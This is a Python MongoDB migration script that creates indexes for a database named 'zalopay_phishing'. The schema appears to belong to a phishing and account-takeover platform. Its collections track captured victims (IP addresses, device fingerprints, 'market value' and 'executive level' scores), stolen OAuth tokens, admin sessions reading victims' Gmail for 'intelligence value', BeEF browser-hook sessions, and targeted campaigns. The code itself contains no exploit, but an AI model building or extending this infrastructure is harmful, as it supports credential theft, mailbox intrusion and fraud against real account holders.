"""
Auto Create Indexes Migration
Adds missing indexes and TTLs according to database schema documentation
Ensures idempotent operations - checks if indexes exist before creating
"""

import logging
from datetime import datetime, timezone
from pymongo import MongoClient, ASCENDING, DESCENDING
from pymongo.errors import OperationFailure, PyMongoError

logger = logging.getLogger(__name__)

class AutoCreateIndexesMigration:
    """Migration to add missing indexes and TTLs per documentation"""

    def __init__(self, mongo_client: MongoClient):
        self.client = mongo_client
        self.db = mongo_client.get_database("zalopay_phishing")

    async def run_migration(self) -> bool:
        """Run the auto-create indexes migration"""
        try:
            logger.info("Starting auto-create indexes migration...")

            # Add missing collections if they don't exist
            await self._create_missing_collections()

            # Create indexes for each collection per documentation
            await self._create_victims_indexes()
            await self._create_oauth_tokens_indexes()
            await self._create_admin_users_indexes()
            await self._create_campaigns_indexes()
            await self._create_activity_logs_indexes()
            await self._create_gmail_access_logs_indexes()
            await self._create_beef_sessions_indexes()

            logger.info("Auto-create indexes migration completed successfully")
            return True

        except Exception as e:
            logger.error(f"Auto-create indexes migration failed: {e}")
            return False

    async def _create_missing_collections(self):
        """Create collections that are referenced by code but may be absent"""
        collections_to_create = [
            "victims", "oauth_tokens", "admin_users", "campaigns",
            "activity_logs", "gmail_access_logs", "beef_sessions"
        ]

        for collection_name in collections_to_create:
            if collection_name not in self.db.list_collection_names():
                self.db.create_collection(collection_name)
                logger.info(f"Created missing collection: {collection_name}")
            else:
                logger.info(f"Collection already exists: {collection_name}")

    async def _create_victims_indexes(self):
        """Create victims collection indexes per documentation"""
        try:
            collection = self.db.victims

            # Email unique index
            await self._create_index_if_not_exists(
                collection, "email", unique=True
            )

            # Capture timestamp descending index
            await self._create_index_if_not_exists(
                collection, [("capture_timestamp", DESCENDING)]
            )

            # Compound index on validation.market_value, validation.status
            await self._create_index_if_not_exists(
                collection, [
                    ("validation.market_value", ASCENDING),
                    ("validation.status", ASCENDING)
                ]
            )

            # Campaign + capture timestamp compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("campaign_id", ASCENDING),
                    ("capture_timestamp", DESCENDING)
                ]
            )

            # IP address index
            await self._create_index_if_not_exists(
                collection, "session_data.ip_address"
            )

            # Device fingerprint index
            await self._create_index_if_not_exists(
                collection, "device_fingerprint.fingerprint_id"
            )

            # Account type + executive level score compound
            await self._create_index_if_not_exists(
                collection, [
                    ("validation.account_type", ASCENDING),
                    ("validation.business_indicators.executive_level_score", DESCENDING)
                ]
            )

            logger.info("Victims indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating victims indexes: {e}")
            raise

    async def _create_oauth_tokens_indexes(self):
        """Create OAuth tokens collection indexes per documentation"""
        try:
            collection = self.db.oauth_tokens

            # Victim ID index
            await self._create_index_if_not_exists(
                collection, "victim_id"
            )

            # Provider + status compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("provider", ASCENDING),
                    ("token_metadata.token_status", ASCENDING)
                ]
            )

            # TTL index on expires_at
            await self._create_index_if_not_exists(
                collection, "expires_at", expireAfterSeconds=0
            )

            # Issued at descending index
            await self._create_index_if_not_exists(
                collection, [("token_metadata.issued_at", DESCENDING)]
            )

            logger.info("OAuth tokens indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating OAuth tokens indexes: {e}")
            raise

    async def _create_admin_users_indexes(self):
        """Create admin users collection indexes per documentation"""
        try:
            collection = self.db.admin_users

            # Username unique index
            await self._create_index_if_not_exists(
                collection, "username", unique=True
            )

            # Email unique index
            await self._create_index_if_not_exists(
                collection, "email", unique=True
            )

            # Role + active status compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("role", ASCENDING),
                    ("is_active", ASCENDING)
                ]
            )

            # Last login descending index
            await self._create_index_if_not_exists(
                collection, [("activity_summary.last_login", DESCENDING)]
            )

            logger.info("Admin users indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating admin users indexes: {e}")
            raise

    async def _create_campaigns_indexes(self):
        """Create campaigns collection indexes per documentation"""
        try:
            collection = self.db.campaigns

            # Code unique index
            await self._create_index_if_not_exists(
                collection, "code", unique=True
            )

            # Status + start date compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("status", ASCENDING),
                    ("timeline.actual_start", DESCENDING)
                ]
            )

            # Campaign manager index
            await self._create_index_if_not_exists(
                collection, "team.campaign_manager"
            )

            # Geographic targeting index
            await self._create_index_if_not_exists(
                collection, "config.geographic_targeting.primary_countries"
            )

            logger.info("Campaigns indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating campaigns indexes: {e}")
            raise

    async def _create_activity_logs_indexes(self):
        """Create activity logs collection indexes per documentation"""
        try:
            collection = self.db.activity_logs

            # Admin ID + timestamp compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("actor.admin_id", ASCENDING),
                    ("timestamp", DESCENDING)
                ]
            )

            # Action + timestamp compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("action_type", ASCENDING),
                    ("timestamp", DESCENDING)
                ]
            )

            # Resource type + resource ID compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("target.resource_type", ASCENDING),
                    ("target.resource_id", ASCENDING)
                ]
            )

            # Timestamp descending index
            await self._create_index_if_not_exists(
                collection, [("timestamp", DESCENDING)]
            )

            # TTL index on retention_expires (2-year retention)
            await self._create_index_if_not_exists(
                collection, "retention_expires", expireAfterSeconds=0
            )

            # Action category + severity + timestamp compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("action_category", ASCENDING),
                    ("severity_level", ASCENDING),
                    ("timestamp", DESCENDING)
                ]
            )

            logger.info("Activity logs indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating activity logs indexes: {e}")
            raise

    async def _create_gmail_access_logs_indexes(self):
        """Create Gmail access logs collection indexes per documentation"""
        try:
            collection = self.db.gmail_access_logs

            # Admin ID + created_at compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("admin_id", ASCENDING),
                    ("created_at", DESCENDING)
                ]
            )

            # Victim ID + created_at compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("victim_id", ASCENDING),
                    ("created_at", DESCENDING)
                ]
            )

            # Initiation timestamp descending index
            await self._create_index_if_not_exists(
                collection, [("session_timeline.initiation", DESCENDING)]
            )

            # Intelligence value descending index
            await self._create_index_if_not_exists(
                collection, [("intelligence_analysis.overall_intelligence_value", DESCENDING)]
            )

            # Status + created_at compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("status", ASCENDING),
                    ("created_at", DESCENDING)
                ]
            )

            logger.info("Gmail access logs indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating Gmail access logs indexes: {e}")
            raise

    async def _create_beef_sessions_indexes(self):
        """Create BeEF sessions collection indexes per documentation"""
        try:
            collection = self.db.beef_sessions

            # Hook ID unique index
            await self._create_index_if_not_exists(
                collection, "hook_id", unique=True
            )

            # Victim ID + created_at compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("victim_id", ASCENDING),
                    ("created_at", DESCENDING)
                ]
            )

            # Status + last seen compound index
            await self._create_index_if_not_exists(
                collection, [
                    ("session_status.status", ASCENDING),
                    ("session_status.last_seen", DESCENDING)
                ]
            )

            # TTL index on expires_at (7 days)
            await self._create_index_if_not_exists(
                collection, "expires_at", expireAfterSeconds=0
            )

            # Success rate descending index
            await self._create_index_if_not_exists(
                collection, [("intelligence_summary.overall_success_rate", DESCENDING)]
            )

            logger.info("BeEF sessions indexes created/verified")

        except Exception as e:
            logger.error(f"Error creating BeEF sessions indexes: {e}")
            raise

    async def _create_index_if_not_exists(self, collection, keys, **options):
        """Create index if it doesn't already exist"""
        try:
            # Convert single key to list format
            if isinstance(keys, str):
                index_keys = [(keys, ASCENDING)]
            elif isinstance(keys, list) and len(keys) == 1 and isinstance(keys[0], str):
                index_keys = [(keys[0], ASCENDING)]
            else:
                index_keys = keys

            # Check if index already exists
            existing_indexes = list(collection.list_indexes())
            index_name = self._generate_index_name(index_keys)

            for existing_index in existing_indexes:
                if existing_index.get("name") == index_name:
                    logger.debug(f"Index {index_name} already exists on {collection.name}")
                    return

            # Create the index
            collection.create_index(index_keys, name=index_name, **options)
            logger.info(f"Created index {index_name} on {collection.name}")

        except PyMongoError as e:
            logger.warning(f"Failed to create index on {collection.name}: {e}")

    def _generate_index_name(self, keys):
        """Generate index name from keys"""
        if isinstance(keys, list):
            key_names = []
            for key, direction in keys:
                key_names.append(key.replace(".", "_"))
            return "_".join(key_names)
        else:
            return str(keys).replace(".", "_")

# Standalone migration function
async def run_auto_create_indexes_migration(mongo_client: MongoClient) -> bool:
    """Run the auto-create indexes migration"""
    migration = AutoCreateIndexesMigration(mongo_client)
    return await migration.run_migration()